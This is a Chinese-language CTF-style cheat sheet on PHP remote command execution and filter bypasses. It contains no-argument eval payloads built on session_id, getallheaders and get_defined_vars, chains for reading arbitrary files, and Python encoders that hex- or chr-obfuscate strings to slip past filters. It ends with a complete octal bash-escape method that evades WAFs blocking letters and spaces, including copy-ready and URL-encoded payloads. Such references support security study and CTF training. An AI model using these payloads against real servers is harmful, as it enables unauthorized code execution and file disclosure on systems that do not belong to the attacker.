|current()或pos()|提取数组第一个元素的值|
|scandir()|显示目录中的所有文件|
|scandir(current(localeconv()))|查看目录|
|var_dump(scandir(current(localeconv())))|输出目录|
|array_flip()|交换数组中的键和值，成功时返回交换后的数组|
|array_rand()|从数组中随机取出一个或多个单元|
|end()|取出数组中的最后一位|
|chdir()|目录跳转，例如chdir('..')就是跳转到上级目录|
|get_defined_vars()|返回由所有已定义变量所组成的数组（全局变量）|
|dirname()|返回当前文件的路径，就是pwd|
|getcwd()|返回当前的工作目录|
|getallheaders()|返回所有的请求头数组|
|getenv()|php7.1版本以后才能使用，获取环境变量|
|time()|返回当前的Unix时间戳|
|localtime()|取得本地时间|
|localtime(time())|返回一个数组，0-60之间|
|__halt_compiler();|停止对当前脚本的编译，可用于去掉后边没用的字符串|
|pos()|取出数组的第一个元素|
|print_r(scandir(next(scandir(getcwd()))));|输出上级目录|
|print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv()))))));|赌狗操作，随机读当前目录文件|

**查看当前目录文件**

```
print_r(scandir(current(localeconv())));
```

**读取当前目录文件**

```
show_source(end(scandir(getcwd())));
show_source(current(array_reverse(scandir(getcwd()))));
```

**随机返回当前目录文件**

```
highlight_file(array_rand(array_flip(scandir(getcwd()))));
show_source(array_rand(array_flip(scandir(getcwd()))));
show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

**查看上级目录**

```
print_r(scandir(dirname(getcwd())));
print_r(scandir(next(scandir(getcwd()))));
print_r(scandir(next(scandir(getcwd()))));
```

**读取上级目录文件**

```
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
```

**查看根目录文件名**

```
print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
```

##### session_id

通过开启session，构造恶意session值进而执行任意恶意代码，构造脚本如下

```
<?php
echo bin2hex("phpinfo();");
?>
```

恶意代码

```
eval(hex2bin(session_id(session_start())));
```

恶意session值

```
phpsessid=706870696e666f28293b
```

##### getallheaders

示例代码

源代码

```
<?php
highlight_file(__FILE__);

$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

**payload:**

```
eval(array_pop(getallheaders()));
```

```
请求头:
因为得是在最后一个，所以用字母让他排到最后,例如：
ZZZZZ=phpinfo();

或者使用
eval(pos(next(array_reverse(getallheaders())));
```

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831399384-6440a23f-a755-4cce-ac79-33d4995af9ec.png)

注意看，此时我们通过print成功输出了getallheaders的数组，并构造了恶意请求头ZZZZZZ，看图可得其位于最后一位

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831399872-afa76283-389c-4873-9d14-a7ea62bd2c51.png)

此时我们可以通过end函数成功提取到了我们构造的ZZZZZ的值

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831401220-12d84971-2575-4628-a146-f7d3238bbc03.png)

将print换成eval即可发现我们成功执行了phpinfo

##### get_defined_vars

```
获取全局变量$_POST   $_GET    $_FILE    $_COOKIE
```

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831400872-a45fac34-7fe5-42d8-9714-25dda429e1f3.png)

由图可得，我们获取了所有的全局变量

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831400992-6c639d21-06cc-4bfb-88ba-a06881fb201c.png)

观察这张图，我利用了两个pos成功提取出了我们恶意构造的123这一变量

![](https://cdn.nlark.com/yuque/0/2025/png/33715413/1755831401356-f37ddceb-1b59-44ee-a2f9-769d4b64fa4e.png)

此时我将print换成了system，再将恶意构造的123换成了系统命令ls，发包后即可发现我们成功执行了ls系统命令

#### 绕过简介

eval类和system类命令执行的绕过大同小异，此处额外提供两个仅在eval类生效的脚本，其本质为php的字符解析机制和php的函数利用，以下可用于绕过特殊字符段的过滤，适用于show_source等多种2.2.2中的显示和包含文件函数的参数构造

**1.16进制绕过"\x77\x61\x66\x2e\x70\x68\x70"，外面必须为双引号**

16进制的构造脚本

```
original_string=''
while(original_string!='end'):
    original_string = input()
    hex_representation = "\\x".join("{:02x}".format(ord(char)) for char in original_string)
    final_result = "\\x" + hex_representation
    print(final_result)
```

**2.chr函数绕过chr(119).chr(97).chr(102).chr(46).chr(112).chr(104).chr(112)**

chr的构造脚本

```
def convert_to_ascii_special(text):
    ascii_special = ''
    for char in text:
        ascii_code = ord(char)
        ascii_special += 'chr({}).'.format(ascii_code)
    ascii_special = ascii_special[:-1]  
    return ascii_special

user_input=''
while(user_input!='end'):
    user_input = input("请输入要转换的字符：")
    result = convert_to_ascii_special(user_input)
    print(result)
```

参考链接：

[https://blog.csdn.net/qq_56815564/article/details/130279662](https://blog.csdn.net/qq_56815564/article/details/130279662)

[https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

[https://blog.csdn.net/kali_Ma/article/details/122544274](https://blog.csdn.net/kali_Ma/article/details/122544274)

来自: [奇安信攻防社区-保姆级命令执行总结](https://forum.butian.net/share/3667)


### 八进制绕过（Octal RCE）完整总结 — Versaga

适用场景
- 服务器端执行：`system($cmd)` / `/bin/sh -c <cmd>`
- WAF 黑名单：屏蔽字母(A–Z,a–z)、空格、以及常见符号（. / ; 等）
- 目标：构造 **不含字母且无空格** 的命令，完成 RCE（如读取 `/realflag`）

核心原理：Bash ANSI‑C 字符串展开
- 语法：**$'...'**（注意必须带 `$`）
- 作用：把转义序列解析为真实字节
- 八进制转义：`\ooo`（o=0–7，最多 3 位）
- 示例：
  - `$'\141'` → `a`
  - `$'\143\141\164'` → `cat`
  - 普通 `'...'` 不解析转义，`$'...'` 才会解析

基本模板（无字母 + 无空格）
- 用 **换行** 或 **Tab** 代替空格分隔命令与参数
  - 换行：`$'\012'`（等价 `\n`）
  - Tab：`$'\011'`（等价 `\t'`）
- 模板：
  - `$'<cmd-in-octal>'$'\012'$'<arg1-in-octal>'$'\012'$'<arg2-in-octal>' ...`

实战示例（读取 /realflag）
1) 直接读 flag（换行做分隔）：
   - `$'\143\141\164'$'\012'$'\057\162\145\141\154\146\154\141\147'`
     - `cat` → `\143\141\164`
     - `/realflag` → `\057\162\145\141\154\146\154\141\147`
2) 列根目录（确认文件名）：
   - `$'\154\163'$'\012'$'\057'`  （`ls` + `/`）

URL 层辅助（穿过网关）
- 将整个 payload 百分号编码后再提交（更稳）：
  - 例：`$'\143\141\164'$'\012'$'\057\162\145\141\154\146\154\141\147'`
    → `cmd=%24%27%5C143%5C141%5C164%27%24%27%5C012%27%24%27%5C057%5C162%5C145%5C141%5C154%5C146%5C154%5C141%5C147%27`
- 如存在双解场景，可按题目情况尝试双重编码

常见受限符号的八进制写法（速查）
- 空格 ` ` : `\040`（但通常用换行/Tab代替）
- 换行 `\n`: `\012`
- Tab `\t` : `\011`
- `/` : `\057`     `.` : `\056`     `-` : `\055`
- `;` : `\073`     `|` : `\174`     `&` : `\046`
- `>` : `\076`     `<` : `\074`     `,` : `\054`
- `'` : `\047`     `"` : `\042`     `\` : `\134`
- `?` : `\077`     `*` : `\052`     `+` : `\053`
- `:` : `\072`     `=` : `\075`     `@` : `\100`
- `(` : `\050`     `)` : `\051`     `$` : `\044`
- `#` : `\043`     `!` : `\041`     `%` : `\045`     `~` : `\176`

为什么必须用 `$`
- `'...'`：不解析 `\ooo`，只输出原样文本
- **`$'...'`**：解析 `\ooo` → 产出真实字节，才能把“无字母”的输入变成字母命令在 shell 中执行

环境与兼容性
- `$'...'` 是 **bash** 的特性；很多 CTF 环境 `/bin/sh` 链到 bash，因此可用
- 若 `/bin/sh` 非 bash（如 dash/ash），`$'...'` 可能失效 → 需改走其它策略（非本总结范围）
- 十进制不支持：`\97` 非法（八进制只有 0–7）

排错与技巧
- 逐步探测：先尝试 `ls /` 确认回显，再 `cat /realflag`
- 分隔优先用换行 `$'\012'`（更稳、更通用）
- 若某符号被过滤，直接在 `$'...'` 内写其 **八进制** 即可（如 `/` → `\057`）
- 如 WAF 过滤 `\`（反斜杠）本体，则本法受限；需换其他编码链路（如纯符号表达式、文件描述符技巧等）

常用命令的八进制编码片段（便于拼接）
- `cat` → `\143\141\164`
- `ls`  → `\154\163`
- `sh`  → `\163\150`
- `echo`→ `\145\143\150\157`
- `/`   → `\057`
- `flag`→ `\146\154\141\147`
- `realflag` → `\162\145\141\154\146\154\141\147`

一键模板（拷贝即用）
- 读 `/realflag`（推荐）：
  - `$'\143\141\164'$'\012'$'\057\162\145\141\154\146\154\141\147'`
- URL 编码版（更稳）：
  - `cmd=%24%27%5C143%5C141%5C164%27%24%27%5C012%27%24%27%5C057%5C162%5C145%5C141%5C154%5C146%5C154%5C141%5C147%27`

小工具建议
- 写本地脚本把任意明文命令按“空白切 token → 每段转八进制 → 用 `$'\012'` 连接 → 可选 URL 编码”
- 输入：`cat /realflag` → 输出：`$'\143\141\164'$'\012'$'\057\162\145\141\154\146\154\141\147'`

结论
- 只要能用 **`$'...'`** 和 **反斜杠**，八进制绕过即可在“无字母 + 无空格”场景稳定构造可执行命令。
- 分隔选 **换行**，符号全部用 **八进制** 表示，逐步探测拿到 flag。
